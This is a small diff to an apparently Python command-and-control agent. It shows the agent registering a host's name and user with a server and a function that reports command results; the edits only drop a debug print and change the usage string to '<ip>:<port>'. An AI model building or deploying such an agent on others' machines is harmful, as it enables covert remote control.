@@ -19,7 +19,6 @@ def connect():
         'hostname': get_hostname(),
         'user': get_whoami()
     }, timeout=REQUEST_TIMEOUT).json()
-    print(r)
     if r["status"]:
         print("[+] connected to server successfully, id =", r["id"])
         return r["id"]
@@ -156,7 +155,7 @@ def send_result(command_id, result):
 
 def main():
     if len(argv) != 2:
-        print("Usage: python main.py <ip>")
+        print("Usage: python main.py <ip>:<port>")
         return
     global agent_id
     global serverip
